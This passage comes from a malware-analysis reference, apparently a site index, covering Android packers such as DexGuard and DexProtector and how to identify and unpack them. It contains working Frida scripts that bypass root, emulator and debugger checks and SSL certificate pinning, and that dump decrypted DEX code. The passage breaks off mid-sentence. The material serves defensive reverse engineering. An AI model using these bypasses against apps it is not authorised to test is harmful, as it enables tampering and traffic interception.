<code>libSecShell.so</code> Bangcle <code>libbaiduprotect.so</code> Baidu <code>libexecmain.so</code> iJiami <code>libnesec.so</code> NeteaseYiDun <code>libAPKProtect.so</code> APKProtect <code>libvdog.so</code> Virbox <code>libdexguard.so</code> DexGuard"},{"location":"packers/chinese-packers/#packer-complexity-ranking","title":"Packer Complexity Ranking","text":"<p>From easiest to hardest to unpack:</p> Tier Packers Approach Easy APKProtect, Baidu, Bangcle (old) <code>frida-dexdump</code> works immediately Medium Tencent Legu, Qihoo 360, iJiami (free) <code>frida-dexdump</code> + class loader hooks Hard NeteaseYiDun, iJiami (paid), DexGuard Timed dumps, string decryption hooks needed Expert Virbox (virtualized), DexGuard (virtualized) VM analysis required, see Virbox page"},{"location":"packers/chinese-packers/#references","title":"References","text":"<ul> <li>APKiD Packer Signatures</li> <li>frida-dexdump</li> </ul>"},{"location":"packers/dexguard/","title":"DexGuard","text":"<p>DexGuard is a commercial Android app protection tool developed by Guardsquare (Belgium). It extends ProGuard/R8 with encryption, tamper detection, and environmental checks. The most commonly encountered commercial protector in Android malware analysis due to its effectiveness and availability.</p>"},{"location":"packers/dexguard/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Guardsquare Origin Belgium Type Commercial Packer/Protector/Obfuscator Platforms Android Companion AppSweep (security testing) Relationship Guardsquare also maintains ProGuard (open-source) and contributes to R8"},{"location":"packers/dexguard/#build-integration","title":"Build Integration","text":"<p>DexGuard operates as a Gradle plugin that runs at build time, requiring access to the application source code. This is a fundamental architectural difference from post-build protectors like DexProtector, which operate on compiled APK/AAB artifacts without source access.</p>"},{"location":"packers/dexguard/#configuration-files","title":"Configuration Files","text":"<p>DexGuard uses two primary configuration files in the project root:</p> <ul> <li><code>dexguard-project.txt</code> -- project-wide protection settings applied to all build variants</li> <li><code>dexguard-release.txt</code> -- release-specific settings (typically stronger protection, applied only to release builds)</li> </ul> <p>These files use the same syntax as ProGuard/R8 rules with additional DexGuard-specific directives:</p> <pre><code>-encryptstrings class com.target.app.**\n-encryptclasses class com.target.app.core.**\n-accessthroughreflection class com.target.app.crypto.** { *; }\n-encryptassetfiles assets/config.json\n-detectemulators com.target.app.SecurityCallback\n-detectroot com.target.app.SecurityCallback\n-detecthookingframeworks com.target.app.SecurityCallback\n</code></pre>"},{"location":"packers/dexguard/#proguardr8-relationship","title":"ProGuard/R8 Relationship","text":"<p>DexGuard extends the ProGuard rule format. Any valid ProGuard configuration works inside DexGuard config files. DexGuard adds encryption and RASP directives on top of the standard obfuscation rules. Projects migrating from ProGuard to DexGuard can keep their existing <code>-keep</code> rules and layer DexGuard-specific protections incrementally.</p> <p>Because DexGuard replaces ProGuard/R8 in the build pipeline rather than running alongside it, the two cannot be used simultaneously. The Gradle plugin intercepts the compilation step where R8 would normally run.</p>"},{"location":"packers/dexguard/#contrast-with-post-build-tools","title":"Contrast with Post-Build Tools","text":"Aspect DexGuard (Build-Time) DexProtector (Post-Build) Source required Yes No Integration point Gradle plugin Command-line tool on compiled APK Polymorphism Per-build variation (different keys, names) Deterministic output Configuration ProGuard-compatible rule files Standalone configuration CI/CD fit Native Gradle task Additional build step Malware use case Requires cracked plugin + build environment Can protect any existing APK <p>The build-time integration is why cracked DexGuard versions are more complex to deploy than post-build tools. The attacker needs a functional Gradle environment with the DexGuard plugin correctly registered, not just a command-line wrapper.</p>"},{"location":"packers/dexguard/#identification","title":"Identification","text":""},{"location":"packers/dexguard/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies DexGuard with signatures like:</p> <pre><code>anti_disassembly : DexGuard (string encryption)\nanti_vm : DexGuard (emulator check)\npacker : DexGuard\nobfuscator : DexGuard\n</code></pre>"},{"location":"packers/dexguard/#file-artifacts","title":"File Artifacts","text":"Artifact Description String encoding classes Classes with names like <code>o</code>, <code>oo</code>, <code>ooo</code> containing string decryption methods Asset files Encrypted DEX payloads in <code>assets/</code> with non-standard extensions Native libraries <code>libdexguard.so</code> or obfuscated native stubs Class names Aggressive single-character naming across all packages Reflection-heavy initialization Application class with extensive reflection in <code>attachBaseContext</code>"},{"location":"packers/dexguard/#distinguishing-from-proguardr8","title":"Distinguishing from ProGuard/R8","text":"<p>ProGuard/R8 only performs name obfuscation and dead code removal. DexGuard adds:</p> <ul> <li>String encryption (strings are decrypted at runtime via method calls)</li> <li>Class encryption (entire classes encrypted, loaded dynamically)</li> <li>Resource encryption</li> <li>Asset encryption</li> <li>Native code obfuscation</li> <li>Anti-tampering checks</li> <li>Environmental checks (root, debug, emulator)</li> </ul> <p>If decompiled code shows method calls returning strings rather than string literals, it is likely DexGuard string encryption.</p>"},{"location":"packers/dexguard/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/dexguard/#string-encryption","title":"String Encryption","text":"<p>Replaces string literals with method calls that decrypt at runtime:</p> <pre><code>String url = ooo.o(\"encrypted_bytes_here\");\n</code></pre> <p>The decryption method uses XOR, AES, or custom algorithms. Keys may be derived from class names, method signatures, or hardcoded values.</p>"},{"location":"packers/dexguard/#class-encryption","title":"Class Encryption","text":"<p>Selected classes are encrypted and stored in assets or resources. At runtime, a custom class loader decrypts and loads them. This defeats static analysis of protected classes entirely.</p>"},{"location":"packers/dexguard/#resource-and-asset-encryption","title":"Resource and Asset Encryption","text":"<p>Layout XML files, strings, and assets can be encrypted. Decryption happens transparently through a patched <code>AssetManager</code> or resource loading hook.</p>"},{"location":"packers/dexguard/#code-virtualization","title":"Code Virtualization","text":"<p>Critical methods can be converted to a proprietary bytecode format executed by an embedded interpreter. Similar to Virbox DEX virtualization but with a different instruction set.</p>"},{"location":"packers/dexguard/#tamper-detection","title":"Tamper Detection","text":"<ul> <li>APK signature verification against expected certificate</li> <li>DEX file checksum validation</li> <li>Native library integrity checks</li> <li>Response: crash, silent data corruption, or delayed termination</li> </ul>"},{"location":"packers/dexguard/#environmental-checks","title":"Environmental Checks","text":"Check Detection Method Root su binary, Magisk, SuperSU, system partition state Emulator Build properties, hardware sensors, telephony state Debugger TracerPid, JDWP, ptrace status Frida Port 27042, frida-agent in /proc/maps, named pipes Xposed XposedBridge class presence, stack trace inspection"},{"location":"packers/dexguard/#polymorphic-builds","title":"Polymorphic Builds","text":"<p>Each DexGuard build produces a structurally unique output. Encryption keys, obfuscated class names, string decryption routines, and control flow transformations all vary between builds of the same application. Two APKs built from identical source with identical DexGuard configuration will have different bytecode.</p> <p>This is DexGuard's most significant defensive property. A Frida script written to hook string decryption in build A will fail on build B because the decryption class name, method signature, and key derivation have all changed. Attackers must re-analyze each build individually. Automated tooling that relies on fixed class names or method patterns breaks across versions.</p> <p>For malware analysis, this means samples from different campaigns or distribution waves require separate unpacking effort even when the underlying malware is identical. Contrast this with DexProtector or Chinese packers, where a single unpacking script transfers across all protected samples.</p>"},{"location":"packers/dexguard/#certificate-pinning","title":"Certificate Pinning","text":"<p>DexGuard includes a built-in SSL/TLS certificate pinning implementation that operates at the native layer, independent of OkHttp's <code>CertificatePinner</code> or Android's <code>NetworkSecurityConfig</code>. The pinning configuration is specified in the DexGuard config file and compiled into the protection layer at build time.</p> <p>This means standard pinning bypass approaches that target OkHttp or <code>TrustManager</code> may be insufficient. The native-level pinning check runs before or alongside Java-layer networking, and a complete bypass requires hooking both layers. Objection's <code>android sslpinning disable</code> covers common Java-level patterns but may miss DexGuard's native implementation.</p>"},{"location":"packers/dexguard/#native-code-obfuscation","title":"Native Code Obfuscation","text":"<p>DexGuard protects JNI code in addition to DEX bytecode. Native libraries linked to the project can receive:</p> <ul> <li>Function-level control flow flattening</li> <li>String encryption within native code</li> <li>Symbol stripping beyond standard <code>strip</code></li> <li>Arithmetic obfuscation of constants</li> </ul> <p>This protection applies to the developer's own native code, not just DexGuard's runtime libraries. When analyzing a DexGuard-protected app that includes JNI components, expect obfuscated native functions that resist standard Ghidra/IDA analysis patterns.</p>"},{"location":"packers/dexguard/#reflection-api-obfuscation","title":"Reflection API Obfuscation","text":"<p>DexGuard encrypts reflection calls (<code>Class.forName()</code>, <code>Method.invoke()</code>, field access) so that the target class and method names are not visible in the bytecode. Instead of a plaintext string like <code>\"com.target.SensitiveClass\"</code>, the reflection target is resolved through the same encrypted string pipeline used for regular string encryption.</p> <p>In decompiled output, this appears as:</p> <pre><code>Class cls = Class.forName(ooo.o(new byte[]{...}));\nMethod m = cls.getDeclaredMethod(oo.o(new byte[]{...}), paramTypes);\nm.invoke(instance, args);\n</code></pre> <p>Hooking the string decryption methods captures these reflection targets alongside other decrypted strings, revealing the hidden class and method references in one pass.</p>"},{"location":"packers/dexguard/#unpacking-approaches","title":"Unpacking Approaches","text":""},{"location":"packers/dexguard/#frida-based-string-decryption","title":"Frida-Based String Decryption","text":"<p>Hook the string decryption methods to log all decrypted strings:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.match(/^[o]+$/)) {\n                try {\n                    var cls = Java.use(className);\n                    var methods = cls.class.getDeclaredMethods();\n                    methods.forEach(function(method) {\n                        if (method.getReturnType().getName() === \"java.lang.String\") {\n                            var methodName = method.getName();\n                            cls[methodName].overload(\"[B\").implementation = function(arr) {\n                                var result = this[methodName](arr);\n                                console.log(className + \".\" + methodName + \" -&gt; \" + result);\n                                return result;\n                            };\n                        }\n                    });\n                } catch(e) {}\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"packers/dexguard/#dex-dumping","title":"DEX Dumping","text":"<p>For class-encrypted builds, dump the decrypted DEX from memory after the class loader has processed it. See Dynamic Analysis for DEX dumping techniques.</p>"},{"location":"packers/dexguard/#class-loader-hook-for-encrypted-classes","title":"Class Loader Hook for Encrypted Classes","text":"<p>When DexGuard uses class encryption, the encrypted payload is decrypted and loaded through a custom <code>ClassLoader</code>. Hooking <code>ClassLoader.loadClass</code> and <code>DexFile</code> operations captures classes as they are decrypted:</p> <pre><code>Java.perform(function() {\n    var ClassLoader = Java.use(\"java.lang.ClassLoader\");\n    ClassLoader.loadClass.overload(\"java.lang.String\", \"boolean\").implementation = function(name, resolve) {\n        var result = this.loadClass(name, resolve);\n        console.log(\"loadClass: \" + name);\n        return result;\n    };\n\n    var DexFile = Java.use(\"dalvik.system.DexFile\");\n    DexFile.loadDex.overload(\"java.lang.String\", \"java.lang.String\", \"int\").implementation = function(src, out, flags) {\n        console.log(\"DexFile.loadDex src=\" + src + \" out=\" + out);\n        return this.loadDex(src, out, flags);\n    };\n});\n</code></pre> <p>This reveals the sequence of dynamically loaded classes and the file paths where decrypted DEX files are temporarily written before loading.</p>"},{"location":"packers/dexguard/#environmental-check-bypass-combined","title":"Environmental Check Bypass (Combined)","text":"<p>DexGuard runs root, emulator, and debugger checks early in the initialization sequence. A combined bypass script handles all three vectors in a single Frida session:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"Blocked System.exit(\" + code + \")\");\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"Blocked Runtime.exit(\" + code + \")\");\n    };\n});\n\nvar fopen = Module.findExportByName(\"libc.so\", \"fopen\");\nInterceptor.attach(fopen, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; (this.path.indexOf(\"/su\") !== -1 ||\n            this.path.indexOf(\"magisk\") !== -1 ||\n            this.path.indexOf(\"supersu\") !== -1)) {\n            retval.replace(ptr(0));\n        }\n    }\n});\n\nvar prop_get = Module.findExportByName(\"libc.so\", \"__system_property_get\");\nInterceptor.attach(prop_get, {\n    onEnter: function(args) {\n        this.name = args[0].readUtf8String();\n        this.value = args[1];\n    },\n    onLeave: function(retval) {\n        if (this.name === \"ro.debuggable\") {\n            this.value.writeUtf8String(\"0\");\n        }\n        if (this.name === \"ro.hardware\") {\n            this.value.writeUtf8String(\"qcom\");\n        }\n        if (this.name === \"ro.product.model\") {\n            this.value.writeUtf8String(\"SM-G998B\");\n        }\n    }\n});\n\nvar connect = Module.findExportByName(\"libc.so\", \"connect\");\nInterceptor.attach(connect, {\n    onEnter: function(args) {\n        var sockaddr = args[1];\n        var port = (sockaddr.add(2).readU8() &lt;&lt; 8) | sockaddr.add(3).readU8();\n        if (port === 27042) {\n            args[1] = ptr(0);\n        }\n    }\n});\n</code></pre> <p>This script blocks process termination, spoofs system properties to hide emulator and root indicators, blocks <code>su</code>/Magisk file access, and prevents Frida port detection. Use with <code>frida -f</code> in spawn mode for early injection.</p>"},{"location":"packers/dexguard/#certificate-pinning-bypass","title":"Certificate Pinning Bypass","text":"<p>For DexGuard's native-level certificate pinning, a layered approach covers both Java and native implementations:</p> <pre><code>Java.perform(function() {\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.checkTrustedRecursive.implementation = function() {\n        return Java.use(\"java.util.ArrayList\").$new();\n    };\n\n    try {\n        var DGPinning = Java.use(\"com.guardsquare.dexguard.runtime.net.SSLPinning\");\n        DGPinning.checkServerTrusted.implementation = function() {};\n    } catch(e) {}\n});\n\nvar SSL_CTX_set_custom_verify = Module.findExportByName(\"libssl.so\", \"SSL_CTX_set_custom_verify\");\nif (SSL_CTX_set_custom_verify) {\n    Interceptor.attach(SSL_CTX_set_custom_verify, {\n        onEnter: function(args) {\n            args[2] = ptr(0);\n        }\n    });\n}\n</code></pre> <p>The DexGuard pinning class name varies across builds due to polymorphism. The <code>com.guardsquare.dexguard.runtime.net.SSLPinning</code> path works for some builds but may need adjustment. reFrida includes SSL pinning bypass snippets that cover multiple DexGuard patterns through class enumeration rather than hardcoded names.</p>"},{"location":"packers/dexguard/#jadx-frida-combined-workflow","title":"JADX + Frida Combined Workflow","text":"<p>The most effective DexGuard analysis combines static and dynamic approaches to reconstruct a readable APK:</p> <pre><code>1. Open the APK in JADX -&gt; identify string decryption classes and encrypted assets\n2. Spawn the app with Frida, hook string decryption methods\n3. Exercise all app functionality -&gt; collect decrypted strings\n4. Run frida-dexdump to capture all loaded DEX files from memory\n5. Replace the original classes.dex with the dumped DEX files\n6. Open the reconstructed APK in JADX\n7. Use the Frida string log as a lookup table to annotate JADX output\n8. For remaining encrypted strings, call the decryption method directly via Frida RPC\n</code></pre> <p>For step 8, Frida RPC allows calling DexGuard decryption functions on demand:</p> <pre><code>rpc.exports = {\n    decrypt: function(className, methodName, hexBytes) {\n        var result = null;\n        Java.perform(function() {\n            var cls = Java.use(className);\n            var bytes = Java.array(\"byte\", hexBytes.match(/.{2}/g).map(function(b) {\n                return parseInt(b, 16);\n            }));\n            result = cls[methodName](bytes);\n        });\n        return result;\n    }\n};\n</code></pre>"},{"location":"packers/dexguard/#automated-dex-dumping-with-frida-dexdump","title":"Automated DEX Dumping with frida-dexdump","text":"<p>frida-dexdump automates the process of scanning process memory for DEX headers and dumping all loaded DEX files. For DexGuard-protected apps, run it after the app has fully initialized to ensure all encrypted classes have been loaded:</p> <pre><code>frida-dexdump -FU\n</code></pre> <p>The <code>-F</code> flag attaches to the foreground app and <code>-U</code> targets a USB-connected device. The tool produces multiple DEX files in the current directory. Some will be framework DEX files -- filter by size and content to identify the application-specific ones. Load the dumped DEX files into JADX for analysis without DexGuard's encryption layer.</p>"},{"location":"packers/dexguard/#bypass-environmental-checks","title":"Bypass Environmental Checks","text":"<p>Hook and return false for all detection methods. Objection's <code>android sslpinning disable</code> and <code>android root disable</code> handle common DexGuard patterns.</p>"},{"location":"packers/dexguard/#malware-usage","title":"Malware Usage","text":"<p>DexGuard is less commonly seen in malware than Chinese packers (Bangcle, Tencent Legu, Qihoo 360) due to its commercial licensing model. However, cracked or leaked versions have appeared in:</p> <ul> <li>Banking trojans targeting European institutions</li> <li>Samples where the original app was legitimately DexGuard-protected and then repackaged with malicious code</li> <li>High-value targeted campaigns where operators invest in professional tools</li> </ul> <p>The protector is more commonly encountered when analyzing legitimate banking and financial apps (the defensive side) rather than the malware itself.</p>"},{"location":"packers/dexguard/#known-family-usage","title":"Known Family Usage","text":"Family Usage Context Anatsa DexGuard-protected droppers on Google Play. String encryption conceals C2 URLs and ATS configuration. Xenomorph v3 samples used DexGuard for string and class encryption. ATS scripting engine encrypted behind class loader. Medusa Some MaaS builds distributed with DexGuard protection to affiliates. Chameleon Earlier variants used DexGuard-style string encryption (potentially cracked version)."},{"location":"packers/dexguard/#versions-and-evolution","title":"Versions and Evolution","text":""},{"location":"packers/dexguard/#versioning","title":"Versioning","text":"<p>DexGuard's version numbering tracks closely with ProGuard releases, since DexGuard is built on top of the ProGuard codebase. Major DexGuard versions correspond to the ProGuard version they extend. Guardsquare releases updates quarterly, adding new detection vectors and obfuscation techniques in each cycle.</p>"},{"location":"packers/dexguard/#cracked-versions-in-the-wild","title":"Cracked Versions in the Wild","text":"<p>Cracked DexGuard copies circulate on underground forums and Telegram channels, primarily versions from 2018--2021. These leaked builds are the primary source of DexGuard-protected malware, since legitimate licensing requires a direct Guardsquare contract.</p> <p>Key differences between cracked and current versions:</p> Aspect Cracked (Leaked) Current (Licensed) Polymorphism Missing or limited -- builds produce similar output Full per-build variation Detection vectors Older checks (no modern Frida/Magisk detection) Continuously updated detection String encryption Basic XOR patterns Advanced multi-layer encryption Config format Older directive syntax Extended directives for new features Gradle compatibility Often locked to older Gradle/AGP versions Supports current Android build toolchain <p>For malware analysts, this distinction matters. Samples using cracked DexGuard are significantly easier to unpack because the obfuscation is weaker and patterns are consistent across samples built with the same leaked version. If a Frida hook works on one sample from a cracked build, it likely works on others from the same version.</p>"},{"location":"packers/dexguard/#evolution-of-detection-capabilities","title":"Evolution of Detection Capabilities","text":"<p>DexGuard's environmental detection has expanded over time:</p> <ul> <li>Pre-2019: Basic root checks (<code>su</code> binary, known package names), ptrace-based debugger detection</li> <li>2019--2020: Added Magisk detection, Frida port scanning, Xposed class inspection</li> <li>2021--2022: Added Magisk module detection, frida-gadget in maps detection, named pipe scanning</li> <li>2023+: Added MagiskHide/Shamiko detection, Frida stalker detection, multiple frida-server signature checks, zygisk module awareness</li> </ul> <p>Older cracked versions lack the later detection layers entirely, which is why samples built with leaked DexGuard often run without issues on rooted devices with modern Frida setups.</p>"},{"location":"packers/dexguard/#analyst-workflow","title":"Analyst Workflow","text":"<p>Step-by-step approach for DexGuard-protected samples:</p> <pre><code>1. Run APKiD -&gt; confirm DexGuard detection\n2. Open in jadx -&gt; look for o/oo/ooo classes with byte[] -&gt; String methods\n3. Install on device/emulator\n4. Attach Frida, hook string decryption classes (script above)\n5. Run the app -&gt; capture all decrypted strings (C2 URLs, API keys, target app list)\n6. If class encryption present -&gt; use frida-dexdump to dump loaded DEX\n7. Decompile dumped DEX normally\n8. For environmental checks -&gt; use Objection or custom Frida hooks to bypass\n</code></pre> <p>For legitimate app analysis (banking app security assessment), the same unpacking approach applies. The key difference is that legitimate apps typically have more layers of protection active simultaneously, including tamper detection that may need hooking before the target functionality is reachable.</p>"},{"location":"packers/dexguard/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature DexGuard Virbox Chinese Packers String encryption AES/XOR with method-level keys VM-based, part of virtualization Basic XOR in native layer Class encryption Custom class loader Full DEX virtualization DEX-in-assets encryption Code virtualization Optional, limited methods Core feature, full DEX Not available Anti-debug Comprehensive (ptrace, JDWP, Frida) Moderate (ptrace, debug flags) Basic (ptrace) Unpacking difficulty Medium (Frida hooks effective) High (VM interpretation needed) Low (standard DEX dump) Cost to attacker High (commercial, cracked copies rare) Medium (Chinese market pricing) Free"},{"location":"packers/dexguard/#references","title":"References","text":"<ul> <li>Guardsquare DexGuard</li> <li>Guardsquare Blog -- Mobile Application Protection</li> <li>APKiD DexGuard Signatures</li> <li>ThreatFabric -- Android Banking Trojan Reports</li> <li>frida-dexdump -- Automated DEX Dumping</li> <li>reFrida -- Frida Script Collection</li> <li>Guardsquare -- DexGuard vs ProGuard Comparison</li> <li>OWASP MASTG -- Android Reverse Engineering</li> <li>Objection -- Runtime Mobile Exploration</li> </ul>"},{"location":"packers/dexprotector/","title":"DexProtector","text":"<p>DexProtector is a commercial Android and iOS application protector developed by Licel. It applies encryption, obfuscation, and native bridging at the bytecode and native levels, combined with a full RASP (Runtime Application Self-Protection) suite. Unlike obfuscation-focused tools such as DexGuard, DexProtector's core strength is its layered runtime protection and asset encryption via vtable hooking in <code>libandroidfw.so</code>. EMVCo-certified for six consecutive years, it is primarily deployed in mobile payments, banking, and fintech applications.</p>"},{"location":"packers/dexprotector/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Licel Origin United States (Los Angeles HQ, London office) Type Commercial Packer/Protector/RASP Platforms Android (4.4+), iOS (11.0+), Apple Watch Certifications EMVCo SBMP SPT (6 consecutive years), PCI MPoC compliant Scale 12+ billion downloads across 85 countries Website licelus.com"},{"location":"packers/dexprotector/#identification","title":"Identification","text":""},{"location":"packers/dexprotector/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies DexProtector through native library naming patterns and asset file signatures:</p> <pre><code>packer : DexProtector\nobfuscator : DexProtector\n</code></pre> <p>The primary detection regex matches native libraries across architectures:</p> <pre><code>/lib\\/(arm.*|x86.*)\\/libdexprotector\\.[A-Za-z0-9.]{2,16}\\.so/\n</code></pre>"},{"location":"packers/dexprotector/#file-artifacts","title":"File Artifacts","text":"Artifact Description <code>libdexprotector.XX.so</code> Main protection library (XX = version digits) <code>libdexprotector_h.so</code> Alternate library naming <code>libdpboot.so</code> Bootstrap loader, loaded first via <code>System.loadLibrary(\"dpboot\")</code> <code>libdp.so</code> Key generation and asset vtable hooking library <code>assets/dp.mp3</code> Encrypted index file mapping method/field indexes to hidden targets <code>assets/dp.arm.so.dat</code> Encrypted native payload (ARM generic) <code>assets/dp.arm-v7.so.dat</code> Encrypted native payload (ARMv7) <code>assets/dp.arm-v8.so.dat</code> Encrypted native payload (ARMv8/ARM64) <code>assets/dp.x86.so.dat</code> Encrypted native payload (x86) <code>META-INF/MANIFEST.MF</code> Contains <code>Protected-By: &lt;version&gt; DexProtector (&lt;date&gt;)</code> <code>dexpro-build.properties</code> Build metadata with version, detection flags configuration"},{"location":"packers/dexprotector/#dexprotector-for-aide-variant","title":"DexProtector for AIDE Variant","text":"<p>A variant targeting AIDE (Android IDE) uses distinct artifacts:</p> Artifact Description <code>assets/classes.dex.dat</code> Encrypted DEX payload <code>assets/eprotect.dat</code> Protection configuration data <code>assets/dp-lib/dp.kotlin-v1.lua.mph</code> Kotlin-specific protection library"},{"location":"packers/dexprotector/#version-identification","title":"Version Identification","text":"<p>The <code>META-INF/MANIFEST.MF</code> entry reveals the exact DexProtector version:</p> <pre><code>Protected-By: 12.3.19 DexProtector (20211214)\n</code></pre> <p>The <code>dexpro-build.properties</code> file contains build configuration:</p> <pre><code>build.version_name=: 1.5 (Beta)\nbuild.version_code=: 15\nreverse.detection=true\nhooks.detection=true\ndevice.detection=true\nsignature.detection=true\n</code></pre>"},{"location":"packers/dexprotector/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/dexprotector/#native-library-loading-chain","title":"Native Library Loading Chain","text":"<p>DexProtector uses a multi-stage native library loading sequence during <code>attachBaseContext</code>:</p> <pre><code>Application.attachBaseContext()\n  \u2514\u2500 System.loadLibrary(\"dpboot\")     \u2192 loads libdpboot.so\n       \u2514\u2500 JNI: loadLibrary(\"dexprotector\") \u2192 loads libdexprotector.so\n            \u2514\u2500 Custom ELF loader           \u2192 decrypts and maps final payload\n                 \u2514\u2500 libdp.so               \u2192 master key generation + vtable hooking\n</code></pre> <p>Each stage handles a specific responsibility: <code>libdpboot.so</code> bootstraps the chain, <code>libdexprotector.so</code> acts as a custom ELF loader that decrypts the protected payload into memory, and <code>libdp.so</code> generates the 32-byte master key used to derive all subkeys for asset decryption.</p>"},{"location":"packers/dexprotector/#asset-encryption-and-vtable-hooking","title":"Asset Encryption and VTable Hooking","text":"<p>DexProtector's most distinctive technique is intercepting Android's native asset loading at the framework level. During initialization, <code>libdp.so</code> modifies the vtable of <code>android::_FileAsset</code> inside <code>libandroidfw.so</code>, replacing virtual function pointers to intercept all asset read operations.</p> <p>When the application accesses any encrypted asset file, DexProtector's intercepted vtable entries decrypt and decompress the content on the fly. The decryption key and nonce are distributed across the file header and a subkey derived from the 32-byte master key. This provides transparent decryption -- the Java layer receives plaintext without any awareness of the encryption layer.</p>"},{"location":"packers/dexprotector/#class-and-dex-encryption","title":"Class and DEX Encryption","text":"<p>Entire DEX files or selected classes are encrypted and stored within the APK. At runtime, the native layer decrypts the DEX payload and loads it through a custom class loader. On ART, the decrypted output may be written as <code>.odex</code> or <code>.dat</code> files temporarily before loading.</p>"},{"location":"packers/dexprotector/#string-encryption","title":"String Encryption","text":"<p>String literals are replaced with native bridge calls that accept an encrypted index parameter. DexProtector uses strong cryptographic algorithms with dynamic keys derived from multiple runtime parameters, making key extraction from static analysis infeasible. White-box cryptography protects the key material from memory inspection.</p>"},{"location":"packers/dexprotector/#hide-access-methodfield-virtualization","title":"Hide Access (Method/Field Virtualization)","text":"<p>When a method call or field access requires protection, DexProtector replaces the instruction with a call to a native bridge function:</p> <pre><code>LibLiveNetTV.i(0x42, arg1, arg2);\n</code></pre> <p>The first parameter is an index resolved against the decrypted <code>assets/dp.mp3</code> file, which maps indexes to the actual methods or fields. This native <code>invokedynamic</code> engine hides the call graph entirely from static analysis tools like JADX and Ghidra.</p>"},{"location":"packers/dexprotector/#resource-and-asset-encryption","title":"Resource and Asset Encryption","text":"<p>Layout XML files, drawables, raw resources, and arbitrary assets are encrypted within the APK. Decryption is handled transparently through the vtable-hooked <code>AssetManager</code>, meaning the application code accesses resources normally while DexProtector handles decryption at the native layer.</p>"},{"location":"packers/dexprotector/#native-code-protection","title":"Native Code Protection","text":"<ul> <li>ELF section encryption (<code>.text</code> section of <code>.so</code> files)</li> <li>JNI bridge obfuscation</li> <li>Symbol stripping and import/export hiding</li> <li>Native library encryption with architecture-specific <code>.dat</code> payloads</li> </ul>"},{"location":"packers/dexprotector/#anti-debugging","title":"Anti-Debugging","text":"Technique Detection Method ptrace Self-attachment to block external debuggers TracerPid <code>/proc/self/status</code> monitoring Debugger detection IDA Pro, GDB, JEB, LLDB process signatures JDWP Java Debug Wire Protocol state inspection Debug flags <code>android:debuggable</code> manifest attribute checks"},{"location":"packers/dexprotector/#anti-tampering","title":"Anti-Tampering","text":"<p>DexProtector applies encryption-based integrity controls with context-sensitive keys calculated dynamically at runtime. Tampering with any protected component invalidates the derived keys, causing decryption to produce garbage rather than triggering an explicit check-and-fail pattern. This design makes patching significantly harder than simple signature verification bypasses.</p> <p>Additional integrity checks include:</p> <ul> <li>APK certificate verification</li> <li>DEX file hash validation</li> <li>Native library content checks</li> <li>File integrity verification across APK contents</li> </ul>"},{"location":"packers/dexprotector/#anti-hooking-and-anti-instrumentation","title":"Anti-Hooking and Anti-Instrumentation","text":"Target Detection Method Frida Port 27042 scanning, <code>frida-agent</code> in <code>/proc/maps</code>, named pipe detection Xposed <code>XposedBridge</code> class presence, stack trace inspection Substrate Library injection detection SO injection <code>/proc/self/maps</code> monitoring for unexpected libraries"},{"location":"packers/dexprotector/#root-and-environment-detection","title":"Root and Environment Detection","text":"Check Method Root <code>su</code> binary, Magisk, SuperSU, system partition integrity Emulator Build properties, hardware characteristics, telephony state Multi-parallel App cloning and dual-space environment detection Custom firmware ROM fingerprinting, bootloader state"},{"location":"packers/dexprotector/#certificate-pinning-communication-hardening","title":"Certificate Pinning (Communication Hardening)","text":"<p>DexProtector provides built-in public key pinning and Certificate Transparency enforcement, blocking MITM proxies and ensuring data flows only to legitimate endpoints. This operates independently of application-level pinning implementations like OkHttp's <code>CertificatePinner</code>.</p>"},{"location":"packers/dexprotector/#vtee-cryptomodule-white-box-cryptography","title":"vTEE CryptoModule (White-Box Cryptography)","text":"<p>The Licel vTEE (Virtual Trusted Execution Environment) is a software-based secure enclave running inside the application process. Unlike hardware TEEs, it creates a logically isolated execution environment through white-box cryptography. The CryptoModule:</p> <ul> <li>Protects cryptographic key material from memory dumps</li> <li>Provides secure storage with device-binding</li> <li>Handles AES, RSA, and other operations within the white-box implementation</li> <li>Prevents key extraction even with full memory access and debugger control</li> </ul>"},{"location":"packers/dexprotector/#unpacking-approaches","title":"Unpacking Approaches","text":""},{"location":"packers/dexprotector/#rasp-bypass-as-prerequisite","title":"RASP Bypass as Prerequisite","text":"<p>DexProtector's RASP checks run before the application fully initializes. If Frida, root, or an emulator is detected, the app terminates immediately. Bypassing these checks is the first step in any analysis.</p> <p>Spawn the application with Frida in spawn mode and hook early:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"Blocked System.exit(\" + code + \")\");\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"Blocked Runtime.exit(\" + code + \")\");\n    };\n});\n</code></pre>"},{"location":"packers/dexprotector/#hooking-the-unlink-call","title":"Hooking the Unlink Call","text":"<p>DexProtector deletes decrypted temporary files after loading. Hooking the native <code>unlink</code> syscall prevents cleanup, leaving decrypted DEX and <code>.odex</code> files on disk:</p> <pre><code>Interceptor.attach(Module.findExportByName(null, \"unlink\"), {\n    onEnter: function(args) {\n        var path = args[0].readUtf8String();\n        console.log(\"unlink: \" + path);\n    },\n    onLeave: function(retval) {\n        retval.replace(0);\n    }\n});\n</code></pre> <p>Returning 0 tricks the process into believing the deletion succeeded while the decrypted files remain accessible at the logged paths.</p>"},{"location":"packers/dexprotector/#dex-dumping-from-memory","title":"DEX Dumping from Memory","text":"<p>Intercept <code>android_dlopen_ext</code> to detect when DexProtector loads its 